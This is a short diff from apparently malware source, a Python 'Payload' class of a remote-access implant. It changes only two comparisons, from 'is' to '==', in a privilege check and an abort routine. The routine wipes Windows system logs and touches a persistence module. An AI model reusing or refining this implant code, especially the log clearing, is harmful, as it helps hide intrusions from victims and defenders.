@@ -525,7 +525,7 @@ class Payload():
             if 'jobs' in attribute:
                 return json.dumps({a: status(_threads[a].name) for a in self.handlers if self.handlers[a].is_alive()})
             elif 'privileges' in attribute:
-                return json.dumps({'username': self.info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
+                return json.dumps({'username': self.info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name == 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
             elif 'info' in attribute:
                 return json.dumps(self.info)
             elif hasattr(self, attribute):
@@ -556,7 +556,7 @@ class Payload():
         """
         globals()['_abort'] = True
         try:
-            if os.name is 'nt':
+            if os.name == 'nt':
                 clear_system_logs()
             if 'persistence' in globals():
                 global persistence
